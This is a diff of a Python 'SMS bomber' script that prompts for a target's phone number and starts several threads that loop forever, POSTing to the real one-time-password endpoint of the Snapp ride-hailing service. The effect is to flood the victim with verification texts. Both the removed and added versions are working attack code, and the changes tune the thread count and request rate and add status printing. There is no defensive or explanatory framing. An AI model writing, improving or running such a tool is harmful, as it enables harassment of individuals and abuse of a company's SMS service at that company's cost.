@@ -2,31 +2,24 @@ import requests
 import time as t
 import threading as th
 
-_phNumber = input("enter the target's phone number. e.x: 9123456789: ")
-_url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
-_payload = {"cellphone": "+98" + _phNumber}
+_phNumber = input("enter the target's phone number with out \"0\" or \"+98\"\nsample phone number: 9123456789: ")
+
 def send_sms(iurl, ipayload):
     while True:
-        requests.post(iurl, json=ipayload)
-        t.sleep(3)
+        r = requests.post(iurl, json=ipayload)
+        t.sleep(1)
+        if r.status_code == 200:
+            print("SUCCEED")
+        else:
+            print("ERROR " + str(r.status_code))
 
-t0 = th.Thread(target=send_sms, args=(_url, _payload))
-t1 = th.Thread(target=send_sms, args=(_url, _payload))
-t2 = th.Thread(target=send_sms, args=(_url, _payload))
-t3 = th.Thread(target=send_sms, args=(_url, _payload))
-t4 = th.Thread(target=send_sms, args=(_url, _payload))
-t5 = th.Thread(target=send_sms, args=(_url, _payload))
-t6 = th.Thread(target=send_sms, args=(_url, _payload))
-t7 = th.Thread(target=send_sms, args=(_url, _payload))
-t8 = th.Thread(target=send_sms, args=(_url, _payload))
-t9 = th.Thread(target=send_sms, args=(_url, _payload))
-t0.start()
-t1.start()
-t2.start()
-t3.start()
-t4.start()
-t5.start()
-t6.start()
-t7.start()
-t8.start()
-t9.start()
+# Snapp Threads
+# init the Threads
+ts0 = th.Thread(target=send_sms, args=('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber}))
+ts1 = th.Thread(target=send_sms, args=('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber}))
+ts2 = th.Thread(target=send_sms, args=('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber}))
+# start the Threads
+ts0.start()
+ts1.start()
+ts2.start()
+# End of Snapp Threads
